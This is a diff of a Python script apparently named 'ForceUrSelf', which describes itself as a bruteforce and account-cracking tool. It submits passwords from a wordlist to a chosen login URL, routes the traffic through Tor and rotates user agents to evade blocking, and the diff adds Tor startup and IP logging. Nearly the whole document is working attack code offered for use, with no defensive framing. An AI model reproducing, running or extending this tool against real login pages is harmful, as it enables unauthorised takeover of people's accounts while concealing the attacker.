@@ -1,18 +1,20 @@
 import requests
 import os
+import methods
+import argparse
 import io
 import stem.process
 import re
-import methods
-import argparse
+import time
+from datetime import datetime
 from platform import platform
 from termcolor import colored
 
-__author__ = "Sami Hindi"
-__version__ = "1.0.0"
+__author__ = 'Sami Hindi'
+__version__ = '1.0.0'
 
 # Set OS Variable to user operating system
-OS = "windows" if "windows" in platform().lower() else "linux"
+OS = 'windows' if 'windows' in platform().lower() else 'linux'
 
 # Set the username of the currently logged in user
 USER_OS = os.getlogin()
@@ -42,49 +44,62 @@ ERROR_MSGS = [
     'inkorrekt'
 ]
 
-# Set the proxy by TOR
-def set_proxy(VERBOSE) -> None:
+def set_proxy():
     SOCKS_PORT = 9050
-    stem.process.launch_tor_with_config(
-        config = {
-            'SocksPort': str(SOCKS_PORT),
-        },
-        init_msg_handler = (lambda line: print(colored(line), 'blue') if re.search('Bootstrapped', line) else False) if VERBOSE else None,
-        tor_cmd = TOR_PATH
+    TOR_PATH = methods.get_tor_path(OS)
+    tor_process = stem.process.launch_tor_with_config(
+    config = {
+        'SocksPort': str(SOCKS_PORT),
+    },
+    init_msg_handler = lambda line: print(colored(line, 'yellow')) if re.search('Bootstrapped', line) else False,
+    tor_cmd = TOR_PATH
     )
 
+    location = methods.get_location()
+
+    print(colored("[INFO] : TOR IP [%s]: %s %s"%(datetime.now().strftime('%d-%m-%Y %H:%M:%S'), location['ip'], location['country']), 'blue'))
+
+
 # Bruteforcing method using TOR proxies
-def bruteforce(username: str, password_list: str, URL, proxy: str, VERBOSE: bool) -> None:
+def bruteforce(username: str, password_list: str, URL, proxy: bool, VERBOSE: bool) -> None:
     # Read the password list
     with open(password_list, 'r', errors='ignore') as password_list:
         passwords = password_list.readlines()
-    
+        
     # Set the proxy to TOR
-    proxy = {
-        'http': 'socks5://127.0.0.1:9050',
-        'https': 'socks5://127.0.0.1:9050' 
-    }
-    
-    # Set the headers
-    headers = {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36'
-    }
-    
-    # Set the form data
-    data = {
-        'username': username,
-        'password': ''
-    }
-    
+    proxies = {}
+    if proxy:
+        # Wait for the tor process to start
+        if OS == 'windows':
+            print(colored('[INFO] : Waiting for TOR to start (this will take around 10 minutes)...', 'blue'))
+            time.sleep(1000)
+        else:
+            os.system('sudo killall tor')
+        # Define the proxy for the requests
+        set_proxy()
+        proxies = {
+            'http': f'socks5://127.0.0.1:9050',
+            'https': f'socks5://127.0.0.1:9050' 
+        }
+
     # Loop over the passwords
     for password in passwords:
-        set_proxy(VERBOSE)
-        data['password'] = password.strip()
-        r = requests.post(URL, headers=headers, data=data, proxies=proxy)
+        # Set the headers
+        headers = {
+            'User-Agent': methods.get_random_user_agent()
+        }
+        
+        # Set the form data
+        data = {
+            'username': username,
+            'password': password.strip()
+        }
+        
+        r = requests.post(URL, headers=headers, data=data, proxies=proxies)
         
         # If the password is correct
         if r.text.lower() not in ERROR_MSGS:
-            print(colored(f'HIT: {password}', 'green'))
+            print(colored(f'[HIT] : {password}', 'green'))
             break
 
 def main(args: list[str]) -> None:
@@ -127,42 +142,45 @@ def main(args: list[str]) -> None:
     
     
 if __name__ == '__main__':
-    # Print logo
-    methods.print_logo()
-    
-    # Instantiate the parser
-    parser = argparse.ArgumentParser(description='ForceUrSelf - Bruteforce & Account cracking')
-    
-    # Get mode from arguments
-    parser.add_argument('-m', '--mode', help='Mode to run ForceUrSelf in', required=True)
-    
-    # Take required username argument
-    parser.add_argument('-u', '--username', type=str,
-                        help='Username to bruteforce')
-    
-    parser.add_argument('-pl', '--password-list', type=str,
-                        help='Passwordlist to use for provided username')
-    
-    # Add proxy argument
-    parser.add_argument('-p', '--proxy', type=str,
-                        help='Proxy to use for requests')
-    
-    # Add verbosity argument
-    parser.add_argument('-v', '--verbose', action='store_true',
-                        help='Use verbose mode')
+    try:
+        # Print logo
+        methods.print_logo()
+        
+        # Instantiate the parser
+        parser = argparse.ArgumentParser(description='ForceUrSelf - Bruteforce & Account cracking')
+        
+        # Get mode from arguments
+        parser.add_argument('-m', '--mode', help='Mode to run ForceUrSelf in', required=True)
+        
+        # Take required username argument
+        parser.add_argument('-u', '--username', type=str,
+                            help='Username to bruteforce')
+        
+        parser.add_argument('-pl', '--password-list', type=str,
+                            help='Passwordlist to use for provided username')
+        
+        # Add proxy argument
+        parser.add_argument('-p', '--proxy', action="store_true",
+                            help='Proxy to use for requests')
+        
+        # Add verbosity argument
+        parser.add_argument('-v', '--verbose', action='store_true',
+                            help='Use verbose mode')
 
-    # Add URL argument
-    parser.add_argument('-url', '--url', type=str,
-                        help='URL to use for bruteforcing')
-    
-    # Parse the arguments
-    args = parser.parse_args()
-    
-    # Handle arguments in parse args method
-    parsed_args = methods.parse_args(args)
-    
-    # Run main method
-    main(parsed_args)
-    
-    print(colored('ForceUrSelf has finished running.', 'green'))
-    
+        # Add URL argument
+        parser.add_argument('-url', '--url', type=str,
+                            help='URL to use for bruteforcing')
+        
+        # Parse the arguments
+        args = parser.parse_args()
+        
+        # Handle arguments in parse args method
+        parsed_args = methods.parse_args(args)
+        
+        # Run main method
+        main(parsed_args)
+        
+        print(colored('ForceUrSelf has finished running.', 'green'))
+    except Exception as err:
+        print(colored(f'ForceUrSelf has encountered an error: {err}', 'red'))
+        
